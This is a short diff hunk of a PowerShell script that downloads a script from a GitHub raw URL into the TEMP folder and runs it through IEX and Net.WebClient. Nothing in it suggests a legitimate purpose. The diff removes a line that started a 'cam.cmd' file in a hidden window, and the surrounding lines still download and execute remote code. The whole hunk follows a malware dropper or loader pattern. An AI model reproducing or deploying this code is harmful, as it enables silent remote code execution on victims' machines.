@@ -10,5 +10,4 @@ Invoke-WebRequest -Uri $url9 -OutFile $output9
 $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
 $output3 = "$env:TEMP\BAT.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
-Start-Process -FilePath "$env:TEMP\cam.cmd" -WindowStyle Hidden
 IEX ((New-Object Net.WebClient).DownloadString($output3))
